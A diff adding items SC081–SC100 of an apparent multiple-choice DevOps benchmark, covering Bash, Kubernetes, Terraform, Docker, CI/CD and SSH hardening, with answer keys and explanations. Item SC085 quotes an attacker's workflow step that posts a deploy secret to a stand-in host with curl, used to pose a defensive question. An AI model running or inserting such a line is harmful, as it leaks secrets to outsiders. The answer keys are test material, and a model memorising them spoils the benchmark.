+      },
+      "answer": "D",
+      "explanation": "When the SIGTERM handler runs, `kill -- -$$` sends SIGTERM to the process group including the shell itself. If the trap is still set, the handler runs again recursively or in a new context. The fix is to reset the signal trap to default (`trap - SIGTERM`) before re-raising, so the shell performs its default action (exit) which then triggers the EXIT trap exactly once.",
+      "topic": "signal_handling",
+      "topic_category": "bash",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC082",
+      "question": "A team migrates their Docker environment from docker-compose v2 to Kubernetes. Their compose file uses:\n\n```yaml\nservices:\n  web:\n    image: myapp:latest\n    deploy:\n      replicas: 3\n    depends_on:\n      db:\n        condition: service_healthy\n    environment:\n      DATABASE_URL: postgres://db:5432/app\n  db:\n    image: postgres:16\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n    healthcheck:\n      test: pg_isready -U postgres\n      interval: 5s\nvolumes:\n  pgdata:\n```\n\nWhat Kubernetes resources are needed to replicate this setup, and what common mistake should they avoid?",
+      "choices": {
+        "A": "A single Deployment with both containers as init and main containers",
+        "B": "Two Deployments with NodePort services and a shared PersistentVolume",
+        "C": "A StatefulSet for Postgres (with PVC), a Deployment for the web app, Services for both, a ConfigMap or Secret for DATABASE_URL. The common mistake: using `depends_on`-style init containers instead of readiness probes, because Kubernetes handles startup ordering through probes, not container dependencies",
+        "D": "A single Pod spec with two containers sharing localhost networking"
+      },
+      "answer": "C",
+      "explanation": "Postgres needs a StatefulSet with a PersistentVolumeClaim for data persistence. The web app uses a Deployment. Both need ClusterIP Services. DATABASE_URL goes in a ConfigMap/Secret. The key mistake is trying to replicate depends_on ordering; in Kubernetes, the web app should have a readiness probe that fails until the database is reachable, letting Kubernetes handle the dependency naturally.",
+      "topic": "workload_types",
+      "topic_category": "kubernetes",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC083",
+      "question": "A Terraform configuration uses a remote S3 backend with DynamoDB locking. During a `terraform apply`, the process is killed mid-operation. The state file is now locked and subsequent operations fail with:\n\n```\nError: Error locking state: Error acquiring the state lock\nLock Info:\n  ID:        a1b2c3d4-e5f6-...\n  Operation: OperationTypeApply\n  Created:   2026-03-01 14:30:00\n```\n\nWhat sequence of steps safely resolves this situation?",
+      "choices": {
+        "A": "Delete the DynamoDB table and recreate it, which releases all locks",
+        "B": "Delete the .terraform directory and run terraform init again",
+        "C": "First verify no other Terraform operations are actually running. Then run `terraform force-unlock a1b2c3d4-e5f6-...` to release the stale lock. Then run `terraform plan` to verify the state is consistent. If the state is inconsistent, restore from the versioned S3 state backup",
+        "D": "Simply wait; the DynamoDB lock has a 5-minute TTL and will auto-expire"
+      },
+      "answer": "C",
+      "explanation": "The resolution requires multiple steps: (1) Confirm the lock is truly stale (no active operations). (2) Use terraform force-unlock with the lock ID to release it. (3) Run terraform plan to check state consistency after the interrupted apply. (4) If resources are in a partial state, use the S3 versioned backup to restore a known-good state. DynamoDB locks do not auto-expire.",
+      "topic": "state_management",
+      "topic_category": "terraform",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC084",
+      "question": "A Linux server running Docker containers is experiencing high I/O wait times. Investigation reveals:\n\n```\n$ cat /proc/diskstats | grep sda\n   8  0 sda 125000 5000 8000000 60000 95000 8000 6400000 120000 0 45000 180000\n$ docker stats --no-stream\nCONTAINER   CPU %   MEM USAGE   NET I/O       BLOCK I/O\napp1        2.5%    256MiB      1.2kB/1.5kB   890MB/2.1GB\napp2        1.8%    128MiB      500B/800B     45MB/120MB\nlogger      0.5%    64MiB       200B/300B     12GB/15GB\n```\n\nThe `logger` container writes 15GB of block I/O despite being a lightweight syslog aggregator. What is the root cause and what multi-step fix do you apply?",
+      "choices": {
+        "A": "The sda disk is failing and needs replacement; the I/O wait is hardware-related",
+        "B": "Restart the Docker daemon to clear the container's block I/O counters",
+        "C": "The logger container has a memory leak; increase its memory limit",
+        "D": "The logger is writing excessive data to its overlay filesystem (likely verbose logs writing to container filesystem instead of a volume). Fix: (1) Add a volume mount for the log output directory, (2) Configure log rotation with max-size and max-file in the Docker daemon or container log config, (3) Apply `--device-write-bps` or cgroup I/O limits to prevent any single container from monopolizing disk I/O"
+      },
+      "answer": "D",
+      "explanation": "The logger container's 15GB block I/O write is disproportionate to its function. It is likely writing logs to the overlay filesystem instead of a volume, causing copy-on-write amplification. The fix requires: (1) redirect output to a volume, (2) implement log rotation to cap growth, (3) set I/O limits via cgroup device throttling to protect the host from any single container's I/O.",
+      "topic": "volumes_bind_mounts",
+      "topic_category": "docker",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC085",
+      "question": "A GitHub Actions self-hosted runner is compromised. An attacker pushed code that modifies the workflow file to exfiltrate secrets:\n\n```yaml\nsteps:\n  - run: curl -X POST https://evil.com/steal -d \"${{ secrets.DEPLOY_KEY }}\"\n```\n\nThe team wants to prevent this class of attack. What combination of defenses should be implemented?",
+      "choices": {
+        "A": "Add a post-job step that checks the workflow file for suspicious URLs",
+        "B": "Switch to GitHub-hosted runners which are immune to all attacks",
+        "C": "Encrypt all secrets with a custom key so they cannot be read in plaintext",
+        "D": "Restrict self-hosted runners to private repos only, require workflow approval for forks via `pull_request_target` restrictions, use environment protection rules requiring review for jobs accessing production secrets, implement branch protection to prevent unauthorized workflow file changes, and configure network egress rules on the runner to block unauthorized outbound traffic"
+      },
+      "answer": "D",
+      "explanation": "This requires defense in depth: (1) Branch protection prevents unauthorized workflow changes on the main branch. (2) Environment protection rules gate access to sensitive secrets behind required reviewers. (3) pull_request_target restrictions prevent fork-based attacks. (4) Network egress rules on self-hosted runners prevent data exfiltration. (5) Private repo restriction limits exposure. No single measure suffices.",
+      "topic": "self_hosted_runners",
+      "topic_category": "cicd",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC086",
+      "question": "A Bash script must atomically update a configuration file while other processes are reading it. The current approach causes occasional blank reads:\n\n```bash\ngenerate_config() {\n    echo \"key1=value1\" > /etc/app/config.conf\n    echo \"key2=value2\" >> /etc/app/config.conf\n    echo \"key3=value3\" >> /etc/app/config.conf\n}\n```\n\nWhat is the correct approach to prevent readers from seeing partial writes?",
+      "choices": {
+        "A": "Write the complete configuration to a temporary file in the same filesystem, then use `mv` (rename) to atomically replace the original file, since rename on the same filesystem is an atomic operation in POSIX",
+        "B": "Set the file as immutable with `chattr +i` before writing and remove it after",
+        "C": "Use `flock` to lock the configuration file during writes and reads",
+        "D": "Use `tee` instead of echo to write all lines simultaneously"
+      },
+      "answer": "A",
+      "explanation": "The write-to-temp-then-rename pattern is the standard POSIX approach for atomic file updates. Writing to a temp file on the same filesystem, then using mv (which calls rename(2)) atomically replaces the old file. Readers either see the complete old file or the complete new file, never a partial state. The temp file must be on the same filesystem for rename to be atomic.",
+      "topic": "file_descriptors",
+      "topic_category": "bash",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC087",
+      "question": "An Ansible playbook manages 200 servers but takes over 2 hours to complete. The current playbook structure:\n\n```yaml\n- hosts: all\n  serial: 1\n  tasks:\n    - name: Update packages\n      apt: update_cache=yes upgrade=safe\n    - name: Deploy application\n      copy: src=app.tar.gz dest=/opt/app/\n    - name: Restart service\n      service: name=myapp state=restarted\n```\n\nWhat changes reduce execution time while maintaining safety?",
+      "choices": {
+        "A": "Increase serial to a percentage (e.g., `serial: \"25%\"`) for rolling updates, separate the apt update into an async task with `async` and `poll`, use `strategy: free` for tasks that do not depend on each other, and add a health check after restart before proceeding to the next batch",
+        "B": "Remove `serial: 1` and run on all 200 hosts simultaneously",
+        "C": "Replace Ansible with a shell script that uses SSH in a for loop",
+        "D": "Use `gather_facts: false` which is the primary bottleneck"
+      },
+      "answer": "A",
+      "explanation": "serial: 1 processes one host at a time (200 sequential runs). Increasing serial to 25% (50 hosts per batch) with rolling updates balances speed and safety. Async tasks let long operations (apt update) run without blocking. strategy: free lets faster hosts proceed independently. Health checks between batches ensure bad deploys are caught early before affecting more hosts.",
+      "topic": "playbook_structure",
+      "topic_category": "ansible",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC088",
+      "question": "A Docker image built for amd64 needs to run on both amd64 and arm64 hosts (mixed fleet with x86 servers and Graviton instances). The current Dockerfile:\n\n```dockerfile\nFROM golang:1.22-bookworm AS builder\nWORKDIR /app\nCOPY . .\nRUN CGO_ENABLED=0 go build -o server .\n\nFROM debian:bookworm-slim\nCOPY --from=builder /app/server /usr/local/bin/\nCMD [\"server\"]\n```\n\nWhat changes are needed to produce a multi-architecture image?",
+      "choices": {
+        "A": "Use `docker buildx create --use` to set up a multi-platform builder, add `ARG TARGETARCH` and `ARG TARGETOS` build args, cross-compile the Go binary using `GOOS=${TARGETOS} GOARCH=${TARGETARCH}`, then build with `docker buildx build --platform linux/amd64,linux/arm64 --push -t myimage:latest .`",
+        "B": "Add `RUN dpkg --add-architecture arm64` to install ARM compatibility libraries",
+        "C": "Build the image twice (once on amd64, once on arm64) and push with different tags",
+        "D": "Change the base image to `--platform=linux/arm64` for the ARM hosts"
+      },
+      "answer": "A",
+      "explanation": "Docker buildx with multi-platform support creates a manifest list containing images for each architecture. Go's cross-compilation with CGO_ENABLED=0 makes this straightforward: the TARGETARCH and TARGETOS build args are automatically set by buildx for each platform. The resulting manifest is pushed as a single tag that Docker automatically resolves to the correct architecture on pull.",
+      "topic": "buildx_multi_arch",
+      "topic_category": "docker",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC089",
+      "question": "A Kubernetes cluster has RBAC configured, but a developer reports they can list secrets in all namespaces despite their RoleBinding only granting access to the `development` namespace:\n\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: dev-access\n  namespace: development\nsubjects:\n- kind: User\n  name: developer@company.com\nroleRef:\n  kind: ClusterRole\n  name: edit\n```\n\n`kubectl auth can-i list secrets --all-namespaces --as=developer@company.com` returns `yes`. What is the likely root cause and what steps diagnose and fix it?",
+      "choices": {
+        "A": "RBAC does not restrict secret listing; you need a NetworkPolicy for that",
+        "B": "The RoleBinding is in the wrong namespace; move it to kube-system to restrict it",
+        "C": "The 'edit' ClusterRole grants cluster-wide access by default when used in a RoleBinding",
+        "D": "There is likely a ClusterRoleBinding granting broader access. Diagnose by running `kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == \"developer@company.com\")'` to find cluster-wide bindings. Fix by removing the overly permissive ClusterRoleBinding and ensuring only namespace-scoped RoleBindings are used for developers"
+      },
+      "answer": "D",
+      "explanation": "A RoleBinding with a ClusterRole only grants permissions within its namespace. Since the developer has cluster-wide access, there must be a ClusterRoleBinding also granting them permissions. The diagnostic step identifies all ClusterRoleBindings referencing that user. Common causes: overly broad initial cluster setup, leftover bindings from testing. Fix by removing the ClusterRoleBinding and auditing all bindings.",
+      "topic": "rbac",
+      "topic_category": "kubernetes",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC090",
+      "question": "A server running multiple Docker containers is suspected of having a container escape vulnerability. An audit reveals:\n\n```\n$ docker inspect suspicious-container | jq '.[0].HostConfig'\n{\n  \"Privileged\": true,\n  \"PidMode\": \"host\",\n  \"NetworkMode\": \"host\",\n  \"Binds\": [\"/:/hostfs:rw\"],\n  \"CapAdd\": [\"SYS_ADMIN\"]\n}\n```\n\nIdentify ALL the security violations and what the hardened configuration should look like.",
+      "choices": {
+        "A": "The NetworkMode:host is the only real issue; the rest are standard Docker defaults",
+        "B": "Only the Privileged flag is a concern; set it to false and the container is secure",
+        "C": "The Binds configuration is the issue; the other settings are acceptable for system containers",
+        "D": "Five critical violations: (1) Privileged:true gives all capabilities, (2) PidMode:host shares host PID namespace, (3) NetworkMode:host shares host network stack, (4) Bind mount of / gives full host filesystem access, (5) CAP_SYS_ADMIN enables mount/unmount and more. Fix: Privileged:false, PidMode:container, NetworkMode:bridge, remove root bind mount, drop all capabilities and add only needed ones, add --read-only, --no-new-privileges, and a non-root USER"
+      },
+      "answer": "D",
+      "explanation": "This container has five independent escape vectors: privileged mode (full device/capability access), host PID namespace (can see and signal host processes), host networking (can bind to host ports), root filesystem mount (read-write access to the entire host), and SYS_ADMIN capability (mount operations). Each alone is a critical finding. The hardened config drops all of these and adds defense-in-depth measures.",
+      "topic": "audit_logging",
+      "topic_category": "security",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC091",
+      "question": "A Bash script needs to parse command-line arguments supporting both short and long options with validation:\n\n```\n./deploy.sh -e production --version 2.5.0 --dry-run -v\n```\n\nThe current implementation using `getopts` only handles short options. What approach correctly handles both short and long options with argument validation?",
+      "choices": {
+        "A": "Parse `$@` as a single string with sed to extract option values",
+        "B": "Use getopts with a double-dash prefix: `getopts 'e:v-:' opt` where the `-:` handles long options",
+        "C": "Use `getopt` with no error handling since GNU getopt is always available and handles everything automatically",
+        "D": "Replace getopts with a while/case loop that shifts arguments, using pattern matching for both short (-e) and long (--version) options:\n```bash\nwhile [[ $# -gt 0 ]]; do\n  case $1 in\n    -e|--environment) env=\"$2\"; shift 2 ;;\n    --version) ver=\"$2\"; shift 2 ;;\n    --dry-run) dry=true; shift ;;\n    -v|--verbose) verbose=true; shift ;;\n    *) echo \"Unknown: $1\"; exit 1 ;;\n  esac\ndone\n```\nThen validate required arguments after the loop."
+      },
+      "answer": "D",
+      "explanation": "A while/case loop with shift is the most portable and maintainable approach for mixed short and long options. Each case arm handles the option and shifts the appropriate number of arguments. Validation of required arguments happens after the loop. This avoids GNU getopt portability issues and getopts' lack of long option support.",
+      "topic": "getopts",
+      "topic_category": "bash",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC092",
+      "question": "A Terraform module provisions an AWS VPC with subnets. After adding a new subnet, `terraform plan` shows it wants to destroy and recreate an existing subnet:\n\n```hcl\nvariable \"subnet_cidrs\" {\n  default = [\"10.0.1.0/24\", \"10.0.2.0/24\"]\n}\n\nresource \"aws_subnet\" \"main\" {\n  count         = length(var.subnet_cidrs)\n  vpc_id        = aws_vpc.main.id\n  cidr_block    = var.subnet_cidrs[count.index]\n  availability_zone = data.aws_availability_zones.available.names[count.index]\n}\n```\n\nThe developer adds `\"10.0.0.0/24\"` to the beginning of the list: `[\"10.0.0.0/24\", \"10.0.1.0/24\", \"10.0.2.0/24\"]`. Why does Terraform want to recreate existing subnets and what is the correct fix?",
+      "choices": {
+        "A": "The availability_zone reference needs to be updated to match the new count",
+        "B": "Terraform's plan algorithm always recreates resources when a list variable changes length",
+        "C": "Using `count` with a list ties each resource to its index. Inserting at the beginning shifts all indices, causing Terraform to see subnet[0] changing from 10.0.1.0/24 to 10.0.0.0/24 (recreate), subnet[1] from 10.0.2.0/24 to 10.0.1.0/24 (recreate), etc. Fix: use `for_each` with a map keyed by CIDR or subnet name instead of count, so resources are identified by key, not index position",
+        "D": "The CIDR blocks overlap and AWS rejects the change"
+      },
+      "answer": "C",
+      "explanation": "count-indexed resources are addressed by their index (aws_subnet.main[0], [1], etc.). Inserting at the beginning shifts all indices, making Terraform think every subnet's CIDR changed. for_each with a stable key (e.g., the CIDR string or a name) makes each resource addressable by key (aws_subnet.main[\"10.0.1.0/24\"]), so additions and removals only affect the changed keys.",
+      "topic": "modules",
+      "topic_category": "terraform",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC093",
+      "question": "A Linux server running LVM has a root volume that is 98% full. The physical volume has free space. The disk layout:\n\n```\n$ pvs\n  PV         VG     Fmt  Attr PSize  PFree\n  /dev/sda2  vg0    lvm2 a--  99.00g 30.00g\n\n$ lvs\n  LV   VG  Attr       LSize\n  root vg0 -wi-ao---- 50.00g\n  swap vg0 -wi-ao----  4.00g\n```\n\nThe root filesystem is ext4. What sequence of commands extends the root filesystem to use 20GB of the free space?",
+      "choices": {
+        "A": "Create a new logical volume with the free space and mount it alongside root",
+        "B": "First extend the logical volume: `lvextend -L +20G /dev/vg0/root`, then resize the filesystem: `resize2fs /dev/vg0/root`. For ext4, resize2fs can be run online (while mounted). Verify with `df -h /`",
+        "C": "Run `resize2fs /dev/vg0/root 70G` directly without any LVM commands",
+        "D": "Unmount root, run fdisk to resize the partition, then remount"
+      },
+      "answer": "B",
+      "explanation": "LVM extension is a two-step process: (1) lvextend increases the logical volume size (or use `lvextend -r` to resize the filesystem in one step), (2) resize2fs grows the ext4 filesystem to fill the new space. ext4 supports online resizing, so no unmount or downtime is required. The shortcut `lvextend -r -L +20G /dev/vg0/root` does both in one command.",
+      "topic": "lvm",
+      "topic_category": "linux",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC094",
+      "question": "A PowerShell script must query the Windows registry to find all installed software versions and export them to CSV. The script works on the developer's machine but fails on some servers:\n\n```powershell\n$software = Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |\n    Select-Object DisplayName, DisplayVersion, Publisher\n$software | Export-Csv -Path C:\\reports\\software.csv -NoTypeInformation\n```\n\nSome servers are missing half the installed software in the report. What is the root cause and the complete fix?",
+      "choices": {
+        "A": "The Export-Csv cmdlet has a row limit; use Export-Clixml instead",
+        "B": "Get-ItemProperty does not support wildcards; each registry key must be enumerated individually",
+        "C": "The HKLM drive is not available on remote servers; use Invoke-Command to access it",
+        "D": "On 64-bit Windows, 32-bit applications register under a different registry path. The script misses `HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*`. Fix: query both paths, combine results, filter out entries with null DisplayName, and sort by name:\n```powershell\n$paths = @(\n  'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',\n  'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'\n)\n$software = $paths | ForEach-Object { Get-ItemProperty $_ } |\n  Where-Object { $_.DisplayName } |\n  Select-Object DisplayName, DisplayVersion, Publisher |\n  Sort-Object DisplayName -Unique\n```"
+      },
+      "answer": "D",
+      "explanation": "On 64-bit Windows, 32-bit applications install their registry entries under WOW6432Node. Querying only the native path misses all 32-bit software. The fix queries both paths, filters null entries (some registry keys are stubs), and deduplicates. This is a common pitfall in Windows system administration scripts.",
+      "topic": "registry_manipulation",
+      "topic_category": "powershell",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC095",
+      "question": "A team needs to set up automated TLS certificate renewal for 50 domains behind an nginx reverse proxy. The current manual process involves running certbot, copying certificates, and reloading nginx. What is the correct automated setup?",
+      "choices": {
+        "A": "Purchase wildcard certificates that never expire from a commercial CA",
+        "B": "Disable HTTPS and use Cloudflare's proxy for TLS termination on all 50 domains",
+        "C": "Use a cron job that runs `certbot renew` once per year since Let's Encrypt certificates last 12 months",
+        "D": "Configure certbot with the nginx plugin and a systemd timer:\n1. `certbot certonly --nginx -d domain1.com -d domain2.com ...` for initial certificates\n2. Enable the `certbot.timer` systemd unit (runs twice daily) which executes `certbot renew`\n3. Add `--deploy-hook 'systemctl reload nginx'` to certbot's renewal config so nginx picks up new certificates automatically\n4. Monitor with a script that checks certificate expiry dates and alerts if any are within 7 days of expiration"
+      },
+      "answer": "D",
+      "explanation": "Let's Encrypt certificates expire after 90 days, requiring automated renewal. The certbot.timer runs renewal checks twice daily (only renewing when within 30 days of expiry). The deploy-hook ensures nginx reloads to pick up new certificates. Monitoring catches any renewal failures before certificates actually expire. This is the standard production setup for Let's Encrypt.",
+      "topic": "ssl_tls_certificates",
+      "topic_category": "networking",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC096",
+      "question": "A Kubernetes Helm chart deployment fails with obscure template rendering errors. The values.yaml:\n\n```yaml\napp:\n  replicas: 3\n  image:\n    repository: myrepo/myapp\n    tag: \"1.0.0\"\n  resources:\n    limits:\n      memory: 512Mi\n    requests:\n      memory: 256Mi\n  ingress:\n    enabled: true\n    hosts:\n      - host: app.example.com\n        paths:\n          - /\n```\n\nThe deployment template has:\n```yaml\nspec:\n  replicas: {{ .Values.app.replicas }}\n  template:\n    spec:\n      containers:\n      - image: {{ .Values.app.image.repository }}:{{ .Values.app.image.tag }}\n        resources: {{ toYaml .Values.app.resources | nindent 10 }}\n```\n\nThe error is: `YAML parse error: mapping values not allowed`. What is wrong and how do you debug and fix it?",
+      "choices": {
+        "A": "Helm does not support nested values; flatten the YAML structure",
+        "B": "The image tag must not be quoted in values.yaml",
+        "C": "The `toYaml` pipeline output with `nindent` is producing incorrect indentation. Debug by running `helm template --debug .` to see rendered output. The fix: ensure `nindent` aligns with the YAML structure. The `resources:` key followed by `{{ toYaml ... | nindent 10 }}` must have the indentation match the container spec level. Change to `resources:\\n{{ toYaml .Values.app.resources | indent 12 }}` or use `resources: {{- toYaml .Values.app.resources | nindent 12 }}` with the dash to trim whitespace before the block",
+        "D": "The ingress configuration is conflicting with the deployment template"
+      },
+      "answer": "C",
+      "explanation": "The toYaml/nindent pipeline is sensitive to whitespace. `resources: {{ toYaml ... | nindent 10 }}` places the YAML block on the same line as the key, then nindent adds a newline and indents. If the indentation does not match the expected YAML level, parsing fails. The fix uses {{- (trim preceding whitespace) and nindent 12 to align with the container spec. `helm template --debug .` reveals the exact rendered YAML for diagnosis.",
+      "topic": "helm_basics",
+      "topic_category": "kubernetes",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC097",
+      "question": "A CI/CD pipeline caches the Docker build layer cache to speed up subsequent builds. The current approach uses GitHub Actions cache:\n\n```yaml\n- uses: docker/build-push-action@v5\n  with:\n    context: .\n    push: true\n    tags: myapp:${{ github.sha }}\n    cache-from: type=gha\n    cache-to: type=gha,mode=max\n```\n\nBuilds are fast on the same branch but slow when switching between feature branches. The cache hit rate is below 30%. What is the root cause and how do you improve it?",
+      "choices": {
+        "A": "The `mode=max` setting prevents cache reuse; change to `mode=min`",
+        "B": "Docker layer caching does not work with GitHub Actions; use a self-hosted runner with local Docker cache",
+        "C": "GHA cache is scoped per-branch with fallback to the default branch only. Feature branches cannot share caches with each other. Fix: use a registry-based cache (`cache-from: type=registry,ref=myregistry/myapp:buildcache` and `cache-to: type=registry,ref=myregistry/myapp:buildcache,mode=max`) which is shared across all branches. Additionally, optimize the Dockerfile layer order to maximize cache reusability (COPY package*.json first, then npm install, then COPY source)",
+        "D": "GitHub Actions cache has a 10GB limit; delete old caches manually"
+      },
+      "answer": "C",
+      "explanation": "GHA cache isolation means feature branches only fall back to the default branch cache, not to each other. Registry-based caching stores layers in a container registry accessible to all branches. Combined with Dockerfile layer ordering (dependency files before source code), this ensures that npm install layers are cached even when source code changes across branches. mode=max caches all layers including intermediate stages.",
+      "topic": "caching_strategies",
+      "topic_category": "cicd",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC098",
+      "question": "A production server has been compromised via an SSH brute-force attack. The immediate containment is done. Now you need to harden the SSH configuration to prevent future attacks. The current `/etc/ssh/sshd_config` uses defaults. What comprehensive hardening changes should be applied?\n\nConsider: authentication method, port, allowed users, rate limiting, protocol settings, and monitoring.",
+      "choices": {
+        "A": "Apply a comprehensive hardening configuration:\n1. `PasswordAuthentication no` + `ChallengeResponseAuthentication no` (key-only auth)\n2. `PermitRootLogin no` (disable root SSH)\n3. `AllowUsers deployer admin` (explicit user whitelist)\n4. `MaxAuthTries 3` + `LoginGraceTime 30` (limit auth attempts)\n5. `Port 2222` (non-standard port reduces noise)\n6. Install and configure fail2ban with SSH jail (ban after 5 failures for 1 hour)\n7. Enable SSH audit logging: `LogLevel VERBOSE`\n8. `ClientAliveInterval 300` + `ClientAliveCountMax 2` (timeout idle sessions)",
+        "B": "Set `MaxAuthTries 1` and `LoginGraceTime 5` which makes brute force impossible",
+        "C": "Install a VPN and only allow SSH from the VPN; no sshd_config changes needed",
+        "D": "Change the SSH port to a non-standard port; this is sufficient to prevent brute-force attacks"
+      },
+      "answer": "A",
+      "explanation": "SSH hardening requires multiple layers: key-only authentication eliminates password brute-force entirely, root login disabling removes the most targeted account, user whitelisting limits the attack surface, rate limiting slows attackers, fail2ban adds active defense, verbose logging enables forensics, and idle timeouts clean up abandoned sessions. No single measure provides adequate protection.",
+      "topic": "ssh_hardening",
+      "topic_category": "security",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC099",
+      "question": "A Git repository uses pre-commit hooks to enforce code quality, but developers bypass them with `--no-verify`. The team wants to enforce checks server-side. The current pre-commit hook:\n\n```bash\n#!/bin/bash\nset -euo pipefail\nnpx eslint --max-warnings 0 $(git diff --cached --name-only --diff-filter=ACM | grep '\\.js$')\nnpx prettier --check $(git diff --cached --name-only --diff-filter=ACM | grep -E '\\.(js|json|md)$')\n```\n\nWhat is the correct multi-layered approach to enforce these checks regardless of developer bypasses?",
+      "choices": {
+        "A": "Use `core.hooksPath` to point to a read-only network share that developers cannot modify",
+        "B": "Implement server-side enforcement:\n1. Add the same checks as a required CI status check in a GitHub Actions workflow triggered on `pull_request`\n2. Enable branch protection on `main` requiring the CI check to pass before merge\n3. Disable force pushes and require PR reviews\n4. Keep the local pre-commit hook via a hook manager (husky/pre-commit framework) for fast developer feedback\n5. Add a `merge_group` trigger for merge queue validation\nThis creates a fast local feedback loop plus an unbypassable server-side gate.",
+        "C": "Configure `.gitattributes` to make hooks mandatory and non-bypassable",
+        "D": "Remove `--no-verify` from Git by patching the Git binary on developer machines"
+      },
+      "answer": "B",
+      "explanation": "Local hooks are always bypassable. The only reliable enforcement is server-side: CI checks run on every PR, branch protection makes them required for merge, and disabling force pushes prevents bypassing the PR workflow. The local hook remains for fast feedback but is not the security boundary. Merge queue validation catches last-minute issues when multiple PRs merge in sequence.",
+      "topic": "branch_protection",
+      "topic_category": "git",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SC100",
+      "question": "A production Kubernetes cluster experiences cascading failures. The sequence of events:\n\n1. Node A's disk fills up, pods are evicted\n2. Evicted pods reschedule to Node B, which is already at 85% memory\n3. Node B goes into MemoryPressure, evicting more pods\n4. Pods land on Node C, overloading it\n5. The entire workload is now on Node C which crashes\n\nThe cluster has 3 nodes, 50 pods, and no resource governance. What combination of Kubernetes features prevents this cascading failure?",
+      "choices": {
+        "A": "Enable pod affinity rules so pods spread across all nodes equally",
+        "B": "Implement multi-layer resource governance:\n1. **Resource requests and limits** on every pod (prevents overcommit; scheduler uses requests for placement decisions)\n2. **LimitRange** per namespace (enforces default and max resource constraints, catches pods without explicit limits)\n3. **ResourceQuota** per namespace (caps total resource consumption, preventing any namespace from consuming the entire cluster)\n4. **PodDisruptionBudgets** for critical workloads (prevents mass eviction)\n5. **PriorityClasses** (ensures critical pods are not evicted first)\n6. **Cluster Autoscaler** (adds nodes when pending pods cannot be scheduled)\n7. **Eviction thresholds** tuned in kubelet config (earlier soft eviction triggers before hard pressure)",
+        "C": "Set up node taints to prevent pods from being rescheduled to already-loaded nodes",
+        "D": "Add more nodes to absorb the load from evictions"
+      },
+      "answer": "B",
+      "explanation": "The cascading failure happened because pods had no resource requests (scheduler cannot make informed placement decisions), no limits (pods can consume unlimited resources), no quotas (one namespace can starve others), and no autoscaling (no new capacity when nodes fill up). The 7-layer approach addresses each failure mode: requests enable smart scheduling, limits prevent runaway consumption, quotas prevent namespace monopolies, PDBs prevent mass eviction, priority classes protect critical workloads, autoscaler adds capacity, and tuned eviction thresholds provide early warning.",
+      "topic": "resource_limits",
+      "topic_category": "kubernetes",
+      "difficulty": "expert",
+      "type": "multi_step"
+    }
+  ]
+}
